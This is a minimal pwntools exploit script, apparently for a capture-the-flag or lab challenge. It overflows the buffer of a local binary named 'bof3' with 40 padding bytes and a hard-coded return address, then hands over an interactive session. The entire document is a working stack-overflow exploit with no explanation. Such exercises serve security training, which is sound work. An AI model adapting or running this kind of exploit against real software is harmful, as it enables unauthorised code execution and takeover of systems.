from pwn import *

p = process("./bof3")

payload = b"a" * 40 + p64(0x401249 + 5)
p.send(payload)
p.interactive()
